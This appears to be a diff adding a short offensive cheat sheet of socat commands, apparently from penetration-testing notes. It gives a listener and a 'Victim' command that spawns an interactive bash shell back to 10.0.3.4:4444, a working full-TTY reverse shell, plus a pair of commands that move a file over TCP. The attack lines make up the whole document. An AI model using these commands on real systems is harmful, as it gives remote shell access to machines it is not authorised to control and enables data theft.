@@ -1,0 +1,7 @@
+For tty reverse shell:
+listen: socat file:`tty`,raw,echo=0 tcp-listen:4444  
+Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
+
+File transfer:
+socat FILE:sender.bin TCP-LISTEN:8282
+socat TCP:10.10.10.10:8282 OPEN:receiver.bin,creat
